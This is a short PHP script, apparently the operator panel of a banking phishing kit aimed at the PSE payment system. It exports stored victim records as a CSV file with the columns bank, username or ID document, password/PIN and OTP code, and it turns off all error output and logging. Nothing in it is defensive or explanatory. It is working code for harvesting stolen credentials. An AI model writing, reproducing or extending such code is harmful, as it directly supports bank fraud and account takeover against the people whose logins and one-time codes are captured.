<?php
// Desactivar toda salida de errores
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

// Limpiar cualquier salida previa
ob_clean();

header('Content-Type: text/csv; charset=utf-8');
header('Content-Disposition: attachment; filename="logs_' . date('Y-m-d_H-i-s') . '.csv"');

$logsFile = __DIR__ . '/data/pse_logs.json';

if (!file_exists($logsFile)) {
    echo "No hay datos para exportar";
    exit;
}

$content = file_get_contents($logsFile);
$logs = json_decode($content, true) ?? [];

if (empty($logs)) {
    echo "No hay datos para exportar";
    exit;
}

$output = fopen('php://output', 'w');

// UTF-8 BOM para que Excel lo lea bien
fprintf($output, chr(0xEF).chr(0xBB).chr(0xBF));

// ENCABEZADOS
fputcsv($output, [
    'BANCO',
    'USUARIO/DOCUMENTO',
    'CONTRASEÑA/CLAVE PIN',
    'CÓDIGO OTP'
]);

// DATOS
foreach ($logs as $log) {
    // Obtener usuario
    $usuario = $log['usuario'] ?? '';
    if (empty($usuario)) {
        $usuario = $log['documento'] ?? '';
    }
    if (empty($usuario)) {
        $usuario = $log['identificacion'] ?? '';
    }
    
    // Obtener OTP
    $otp = $log['codigo_otp'] ?? '';
    if (empty($otp)) {
        $otp = $log['codigo_dinamica'] ?? '';
    }
    
    fputcsv($output, [
        $log['banco'] ?? '',
        $usuario,
        $log['clave_pin'] ?? '',
        $otp
    ]);
}

fclose($output);
exit;
?>